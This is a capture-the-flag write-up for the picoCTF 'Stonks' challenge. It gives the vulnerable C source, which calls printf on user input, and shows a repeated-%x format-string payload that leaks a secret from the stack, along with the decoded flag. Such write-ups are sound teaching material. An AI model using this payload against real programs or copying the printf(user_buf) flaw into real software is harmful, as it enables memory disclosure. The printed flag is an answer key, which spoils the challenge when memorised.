# Description

![Screenshot from 2023-02-19 12-10-17](https://user-images.githubusercontent.com/115702866/219933189-77e90bb0-e75a-4fa1-86f6-4dcaddd90f3f.png)

# Solution 

First we run the program.

```t
youguess@youguess-Inspiron-14-5410-2-in-1:~$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
asdf;lkj
Buying stonks with token:
asdf;lkj
Portfolio as of Sun Feb 19 06:44:30 UTC 2023


1 shares of JSV
6 shares of NWQ
16 shares of YCAU
6 shares of Z
27 shares of OI
76 shares of ZZON
3 shares of MF
98 shares of SHS
57 shares of UPHS
305 shares of KZ
Goodbye!
```

On giving an input of 1 we are giving the option of buying stocks by entering an api token. Entering a random api token results in the purchase of shares 
of varying quantities.

```t
youguess@youguess-Inspiron-14-5410-2-in-1:~$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
2

Portfolio as of Sun Feb 19 06:47:08 UTC 2023


You don't own any stonks!
Goodbye!
```
Trying to view my portfolio by entering 1 results in the above message being displayed.
I then checked the source code providedF.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```
In the function buy_stonkso we see that is reading the flag(api) from the file 'api' and storing it in the stack 'api_buf'. It then aks the user to input 
their api token which is stored in the stack 'user_buf' and then prints it. After doing some reading I found out that this is a type of string format 
vulnerability. We can exploit this by inputting %x repeatedly to read the api from the stack to extract the hexadecimal values.
```t
youguess@youguess-Inspiron-14-5410-2-in-1:~$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x 
Buying stonks with token:
989e450804b00080489c3f7f75d80ffffffff1989c160f7f83110f7f75dc70989d1801989e430989e4506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffe1007d
Portfolio as of Sun Feb 19 07:44:51 UTC 2023


1 shares of THT
1 shares of W
7 shares of QTDX
11 shares of JUN
4 shares of BQB
60 shares of H
14 shares of SR
95 shares of VRI
152 shares of Y
150 shares of SF
1478 shares of KIR
Goodbye!
```
Converting this hexadecimal to ASCII we get text that vaguely resembles the flag. I realised that the bytes are not in the right order as we extracted them from a stack in the top down uproach. After rearranging them in the right order the obtained flag was picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}


